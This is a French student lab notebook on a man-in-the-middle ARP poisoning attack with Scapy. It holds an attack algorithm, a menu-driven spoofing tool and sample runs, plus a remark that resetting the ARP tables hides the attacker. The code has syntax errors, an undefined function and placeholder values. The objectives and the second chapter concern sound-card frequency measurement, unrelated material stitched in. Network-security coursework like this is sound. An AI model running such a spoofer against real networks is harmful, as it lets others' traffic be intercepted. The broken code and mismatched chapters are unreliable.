# %% [markdown]
# # <img src="https://i.pinimg.com/originals/df/5e/50/df5e50c1c38f2bf8a142ca3f354d89f8.jpg" align=center style="width: 600px;">

# %% [markdown]
# # <span style="color:red">SAE TRANSVERSALE - Binôme 2 : ARVIN-BÉROD Maxence</span>
#
# <h3>Partie : Attaque MITM ARP poisoning avec Python Scapy</h3> <br>
#
# **Groupe :** <br>
#     - Binôme 1 : Nathan et Jean-Pierre <br>
#     - Binôme 2 : Maxence <br>
#     - Binôme 3 : Adrien et Quentin <br>
#
# Bienvenue sur notre SAE TRANSVERSALE qui sera sur **L'INTERCEPTION TÉLÉPHONIQUE**. </br>
#
# Ce projet coniste à vérifier que vous nous bien acquis une grande partie des apprentissages critiques des 3 compétences de première année :
#
#     - Administrer les réseaux et l’Internet
#     - Connecter les usagers et les entreprises
#     - Créer des outils et application informatiques pour les R&T

# %% [markdown]
# <img src="https://imgur.com/e6ccSQk.png" align=center style="width: 800px;">
#
# Dans ce **notebook**, vous découvrirez étape par étape ce que j'ai fais pour arriver à effectuer l'attaque MITM ARP poisonning avec Scapy. Il y'aura aussi des parties avec mes camarades, si j'ai eu besoin d'aide ou si j'ai aidé.<br>
# De plus, vous aurez un aperçu des réunions.
# <br>
#
#
# Nous utiliserons le langage de programmation `Python` et 1 bibliothèque importante pour réaliser ce projet :
# - `Scapy`
#
#
# ### <span style="color:red">Bibliothèque Scapy : </span>
# `Scapy` est un puissant programme interactif de manipulation de paquets.<br><br>
#
#     • Points forts :
# **<p style="color:green">Langage interactif de haut niveau </p>**
# **<p style="color:green">Forge et analyse de paquets très simples </p>**
# **<p style="color:green">Passe le firewall local </p>**
# **<p style="color:green">Envoi, réception et  construction de paquets (2-4) </p>**
# **<p style="color:green">Lecture de fichier pcap </p>**
#
#
# <br>
#
#     • Points faibles :
# **<p style="color:red">Fournit les résultats bruts, ne les interprète pas </p>**
# **<p style="color:red">Support partiel de certains protocoles complexes  </p>**
#
# <img src="https://imgur.com/xonp1lB.png" align=center style="width: 200px;">

# %% [markdown]
# <img src="http://www.theatre2lacte-lering.com/theatre2lacte/wp-content/uploads/2015/02/les-objectifs-800x200.png" align=center style="width: 500px;">
#
#
# ### <span style="color:darkgreen">Chapitre 1 : Tâches prioritaires | attaque MITM ARP poisoning avec Python et Scapy</span>
#
# - Créer un programme en Python pour effectuer la mesure de la réponse en fréquence d'un sytème de transmission entre 2 PC via les cartes son.
#
# - Créer un programme python pour la mesure de la fréquence et de l'amplitude de la sinusoïde reçue sur le PC récepteur
#
# ### <span style="color:darkgreen">Chapitre 2 : Tâches supplémentaires | gestion des arguments pour lancer le script</span>
#
# - Mesurer manuellement la réponse en fréquence des cartes son
#
# - Tracer le résultat de notre mesure

# %% [markdown]
# # <span style="color:darkgreen">Chapitre 1 : Explications et programme</span>
#
# <span style="color:red">**Déroulement du chapitre:**</span>
# <div class="alert alert-block alert-info bilan">
#
# Dans un premier temps, nous allons nous intéresser à la partie théorique avant la pratique. Ensuite, nous verrons la partie pratique avec le programme à réaliser et l'interface.
# </div>
#
# ### <span style="color:red">1) Schéma de compréhension du fonctionnement d'une attaque MITM ARP poisonning : </span>

# %% [markdown]
# <img id='schema' src="https://imgur.com/FNo6azf.png" align=center>
#
#
#
# ### <span style="color:red">Paquet ARP : </span>
#
# `ARP`est un protocole qui signifie *Address Resolution Protocol* donc un protocole de résolution d'adresse qui permet d'associer l'adresse de protocole de couche réseau (typiquement une adresse IPv4) d'un hôte distant, à son adresse de protocole de couche de liaison (typiquement une adresse MAC).

# %% [markdown]
# ### <span style="color:red">2) Mise en place de l'architecture ci-dessous :</span>

# %% [markdown]
# ### Architecture :
#
# <img src="https://imgur.com/sHxOStW.png" align=center>
#
# ### Routeur :
# <img src="https://imgur.com/Db4uIgS.png" align=center width="250">
#
# Je lui assigne l'IP 192.168.1.250 à l'interface FE0/0<br>
#
# J'arrive bien à ping mon routeur via mon PC en 192.168.1.10
#
# ### Téléphone :
# <img src="https://imgur.com/0IbL5pv.png" align=center width="250">
#
# Je lui met l'IP 192.168.1.20n le masque  en /24 et le gateway en 192.168.1.250<br>
# J'arrive bien à ping mon téléphone via mon PC en 192.168.1.10
#
# ### Switch :
# <img src="https://imgur.com/F5owu9k.png" align=center width="250">
#
# Je met l'ip du routeur par défaut : 192.168.1.250

# %% [markdown]
# ### <span style="color:red">3) Écrire un algorithme (sans codage à cette étape) dans le notebook décrivant les différentes étapes de l’attaque. </span>

# %% [markdown]
# #### <span style="color:red">Étape 1 : </span>
#
# Activer le IP Forwarding pour pouvoir faire transiter des paquets d’une interface réseau à une autre :
#
# *echo 1 > /proc/sys/net/ipv4/ip_forward*
#
# #### <span style="color:red">Étape 2 : </span>
#
# Télécharger scapy et importer ses librairies :
#
# *import scapy.all as scapy* <br>
# *import time<br>
# import sys*<br>
#
#     - scapy : pour créer des paquets ARP
#     - temps : pour créer un intervalle entre l’envoi de paquets afin que cela soit plus propre (personnel).
#     - sys : pour l’impression dynamique afin d'utiliser des arguments.
#
# #### <span style="color:red">Étape 3 : </span>
#
# Nous allons cibler l'adresse IP de notre machine victime (le téléphone), son adresse MAC et spoof (usurper) l'adresse IP du routeur et  son adresse MAC.
#
#
# Donc, la première fois que j'utiliserai mon spoofer ce sera pour dire à la victime que je suis le routeur.
#
# Et ensuite, mon autre bout de code pour dire à mon routeur que je suis la machine victime, en loccurence, le téléphone.
#
# **Cela reprend bien notre schéma explicatif juste [ici](#schema)**
#
# #### <span style="color:red">Étape 4 : </span>
#
# Je continue le script avec la boucle while permettant de pratiquer une sorte de **callback** qui rappele mes fonctions de spoofing et donc envoie les paquets aux victimes qui fait en sorte de nous garder en tant que **MAN IN THE MIDDLE**.
#
# #### <span style="color:red">Étape 5 : </span>
#
# Vérification en éxécutant ma table arp en faisant *arp -a* et wireshark en filtrant par paquer `ARP`
#
# #### <span style="color:red">Étape 6 : </span>
#
# Si tout fonctionne nous devrions voir notre routeur avec comme adresse MAC celle de notre pc.
# Ce qui fait que nous devrions être au milieu entre le téléphone et le routeur ahah.
#
# <img src="https://media3.giphy.com/media/lp3GUtG2waC88/giphy.gif?cid=ecf05e472wafszus5zk486qgb56li4qfeo84paq3vcgmbf77&rid=giphy.gif&ct=g.gif" align=center>

# %% [markdown]
# ### <span style="color:red">4) Choisir des fonctions qui permettront de réaliser l’algorithme </span>

# %% [markdown]
# Comme dit précédemment, j'utiliserais une fonction spoofing permettant de créer des paquets ARP et spoof ainsi ma victime.
#
# Je pourrais créer une fonction permettant de s'assurer de revenir à l'état normal lorsque nous quittons mon programme. Cela enverra de nouveaux paquets ARP avec mes informations correctes.
# Ainsi, cela permet de revenir au point de départ, comme si de rien n'était. Il suffit que la personne ne soit pas très bonne et ne pourra jamais remonter jusqu'à vous.
#
# Puis je vais utiliser une boucle pour spoof et rester au milieu.

# %% [markdown]
# ### <span style="color:red">5) Répartition des tâches : </span>

# %% [markdown]
# Maxence : Tout le programme

# %% [markdown]
# ### <span style="color:red">6) Coder l’algorithme : </span>

# %%
#---------------------------------------------------------

# Importation des librairies 

#---------------------------------------------------------

import scapy.all as scapy # on importe tous les modules de Scapy.
import time # on importe la librairie time permettant de mettre des pauses entre chaque envoient de paquets.
import argparse # on importe la librairie argparse permettant d'ajouter des arguments très simplement.
import sys # on importe la librairie sys pour permettre des impressions dynamiques


#---------------------------------------------------------

# Boîte à outil

#---------------------------------------------------------


print("""  _____                           __  __                      _   _           
  / ____|                         |  \/  |                    | | (_)           
 | |     __ _  ___  ___  __ _ _ __| \  / | __ ___  _____ _ __ | |_ _ _   _ ___  
 | |    / _` |/ _ \/ __|/ _` | '__| |\/| |/ _` \ \/ / _ \ '_ \| __| | | | / __| 
 | |___| (_| |  __/\__ \ (_| | |  | |  | | (_| |>  <  __/ | | | |_| | |_| \__ \ 
  \_____\__,_|\___||___/\__,_|_|  |_|  |_|\__,_/_/\_\___|_| |_|\__|_|\__,_|___/ 
                                                                                \n
                                                                                \n """)
# Création de ma fonction main étant le principal menu de ma boîte à outil
def main():
	while True : # Boucle pour revenir aux demandes au cas ou l'utilisateur n'intérargi pas avec une fonction
		n = input("1- Network Scanner\n2- ARP Spoofing\n3- Exploit\n\nEntrez un nombre : ") # Création des choix du menu
		if n == '1': # boucle qui renvoie à un print si l'utilisateur choisi 1
			print("***********************************************************************") 
			print("En cours de construction")
			print("***********************************************************************") 
		elif n == '2': # boucle qui va renvoyer l'utilisateur à la fonction si il choisit 2
			arpspoof()
		elif n == '3':# boucle qui renvoie à un print si l'utilisateur choisi 3
			print("***********************************************************************") 
			print("En cours de construction")
			print("***********************************************************************") 
            
		else: # boucle qui renvoie à un print si l'utilisateur choisi un nombre inexistant du menu
			print("***********************************************************************") 
			print("Cette option est inexistante")
			print("***********************************************************************") 


# Fonction principale permettant de faire fonctionner tout le programme
def arpspoof():    
    # Message de bienvenue
	print("***********************************************************************")  
	print("**********Bienvenue sur le ARP Spoofer de CaesarMaxentius**********")
	print("***********************************************************************")   
    # Définition de mes fonctions dynamiques permettant à l'utilisateur d'entrer lui-même ses charactères
	targetIP = input("Entrez l'adresse IP de la victime : ") # On défini la fonction targetIP qui sera l'IP de la victime
	spoofIP = input("Entrez l'adresse IP que vous voulez usurper : ") # On défini la fonction spoofIP qui sera l'IP que nous voudrons usurper.
	gatewayIP = input("Entrez l'adresse IP du routeur : ")
# -----------------
    # A MODIFIER
	destinationMac = input("Entrez l'adresse MAC de la victime : ") 
# -----------------

	destinationIP = targetIP # Cela reprend notre précédente fonction (IP de la victime)
	sourceIP = input("Entrez votre adresse IP (pour reset lorsque vous aurez terminé) : ") # Pour s'assurer de revenir à l'état normal, nous renverrons des paquets ARP correctes.

# -----------------
    # A MODIFIER
	sourceMAC = 'x'
# -----------------

# Message de lancement

# -----------------

	print(
"\n##::::::::::'###::::'##::: ##::'######::'########:'##::::'##:'########:'##::: ##:'########::::\n"
"##:::::::::'## ##::: ###:: ##:'##... ##: ##.....:: ###::'###: ##.....:: ###:: ##:... ##..:::::\n"
"##::::::::'##:. ##:: ####: ##: ##:::..:: ##::::::: ####'####: ##::::::: ####: ##:::: ##:::::::\n"
"##:::::::'##:::. ##: ## ## ##: ##::::::: ######::: ## ### ##: ######::: ## ## ##:::: ##:::::::\n"
"##::::::: #########: ##. ####: ##::::::: ##...:::: ##. #: ##: ##...:::: ##. ####:::: ##:::::::\n"
"##::::::: ##.... ##: ##:. ###: ##::: ##: ##::::::: ##:.:: ##: ##::::::: ##:. ###:::: ##:::::::\n"
"########: ##:::: ##: ##::. ##:. ######:: ########: ##:::: ##: ########: ##::. ##:::: ##:::::::\n"
"........::..:::::..::..::::..:::......:::........::..:::::..::........::..::::..:::::..:::::::\n"
)



	def spoofer(targetIP, spoofIP):
		packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
		scapy.send(packet, verbose=False)

	def restore(destinationIP, sourceIP):
		packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=getMac(destinationIP),psrc=sourceIP,hwsrc=sourceMAC)
		scapy.send(packet, count=4,verbose=False)


	packets = 0
	try:
		while True:
			spoofer(targetIP,gatewayIP)
			spoofer(gatewayIP,targetIP)
			print("\rCaesar HACKING : [+] Envoie de paquets "+ str(packets)),
			sys.stdout.flush()
			packets +=2
			time.sleep(2)
	except KeyboardInterrupt:
		print("***********************************************************************")  
		print("\nInterrompre le Spoof en faisant CTRL + C------------ Retour à l'état normal..")
		print("***********************************************************************") 
		print( 
"\n   _____    ___.   .__               __          __   "
"\n  /  _  \   \_ |__ |__| ____   _____/  |_  _____/  |_ "
"\n /  /_\  \   | __ \|  |/ __ \ /    \   __\/  _ \   __\"
 \n/    |    \  | \_\ \  \  ___/|   |  \  | (  <_> )  |  "
"\n\____|__  /  |___  /__|\___  >___|  /__|  \____/|__|  "
"\n        \/       \/        \/     \/                  "
)
		print("***********************************************************************") 0
		restore(targetIP,gatewayIP)
		restore(gatewayIP,targetIP)
        
        
if __name__ == "__main__":
	main()        
        
        






#-----------------------------------------------------------------------------
#------------------------------ PARTIE CODE ----------------------------------
#-----------------------------------------------------------------------------
# Out:
#   _____                           __  __                      _   _
#   / ____|                         |  \/  |                    | | (_)
#  | |     __ _  ___  ___  __ _ _ __| \  / | __ ___  _____ _ __ | |_ _ _   _ ___
#  | |    / _` |/ _ \/ __|/ _` | '__| |\/| |/ _` \ \/ / _ \ '_ \| __| | | | / __|
#  | |___| (_| |  __/\__ \ (_| | |  | |  | | (_| |>  <  __/ | | | |_| | |_| \__ \
#   \_____\__,_|\___||___/\__,_|_|  |_|  |_|\__,_/_/\_\___|_| |_|\__|_|\__,_|___/
#
#
#
#
# 1- Network Scanner
# 2- ARP Spoofing
# 3- Exploit
#
# Entrez un nombre : 2
# ***********************************************************************
# **********Bienvenue sur le ARP Spoofer de CaesarMaxentius**********
# ***********************************************************************
# Entrez l'adresse IP de la victime : 192.168.1.10
# Entrez l'adresse IP du routeur : 192.168.1.250
# Entrez l'adresse MAC de la victime : A4-BB-6D-D2-80-B9
# ...

# %% [markdown]
# # <span style="color:darkgreen">Chapitre 2 : Mesures, tracés, et définitions</span>
#
# <span style="color:red">**Déroulement du chapitre:**</span>
# <div class="alert alert-block alert-info bilan">
#
# Dans un deuxième temps, nous allons étudier une partie un peu plus théorique, la **fréquence de coupure** pour nôtre système.
# </div>
#
# ### <span style="color:red">1) Plage de fréquences des signaux audio. </span>
#
# <span style="color:red">Définition :</span> *Une plage de fréquences est une aire dans laquelle des ondes, des fréquences sont envoyées et reçues. </br>
# Chaque plage ainsi définie représente un spectre de fréquences, par analogie avec le spectre de la lumière visible. </br>
# La plage de fréquence peut aller de 20Hz à 20KHz.*

# %% [markdown]
# BINOME 1 :

# %% [markdown]
# ***Récapitulatif*** :
#
# 1. On nous donne la fréquence
# 2. On nous donne la fréquence d'échantillonnage
# 3. On cherche N grâce à ces deux valeurs car nous n'avons pas N sachant que l’erreur de mesure d’amplitude en % pour le cas le plus défavorable est en fonction de N.
# 4. Grâce à la formule de l'écart en pourcentage, nous obtenons la marge d'erreur pour l'amplitude pour la sinusoïde de fréquence 1KHz et 20KHz et une fréquence d’échantillonnage de 192KHz

# %% [markdown]
# <img src="https://www.consultancy.nl/profile/media/conclusion-spotlight-2018-05-17-123251893.png" align=center style="width: 400px;">

# %% [markdown]
# Nous n'avons malheureusement pas eu le temps de finir sachant que nous sommes un peu plus long mais nous l'aurions fini.</br>
# Nous avons préférés terminer par le 2. du chapitre 3 pour finaliser le notebook et le paufiner pour qu'il soit agréable et intuitif à lire.</br>
# Nous avons fais le maximum pour détailler et expliquer que ce soit les programmes, les calculs, nos méthodes, nos chapitres, ...</br>

# %% [markdown]
# **Notre SAE se résume par le fait que :**
# - Nous avons bien mesuré la réponse en fréquence d'un sytème de transmission entre 2 PC via les cartes son
# - Nous avons bien mesuré la fréquence et l'amplitude de la sinusoïde reçue sur le PC récepteur
# - Nous avons bien mesuré manuellement la réponse en fréquence des cartes son
# - Nous avons bien tracé le résultat de notre mesure
# - Nous avons bien fait les dessins et tracés du signal pour le cas le plus favorable et défavorable
# - Nous avons bien déduis l'erreur de mesure d'amplitude en % de nos 2 sinusoïdes différentes
# <img src="http://www.pngmart.com/files/7/Check-Background-PNG.png" align=right style="width: 50px;"></img>
#
# **Ce que nous n'avons pas terminés dans le dernier chapitre:**
#
# - Faire un dessin en indiquant la durée de mesure la plus favorable et le cas le plus défavorable pour la mesure de fréquence.
# - Indiquer la fréquence maximale que nous pouvons trouver pour la durée de mesure à 10KHz.
# - Indiquer la problématique sur la précision de la mesure de fréquence si le signal est bruité.
# - Indiquer quel élément peut être utilisé pour régler ce problème et expliquer le fonctionnement de cet élément
# <img src="http://sweetclipart.com/multisite/sweetclipart/files/x_mark_red.png" align=right style="width: 50px;"></img>
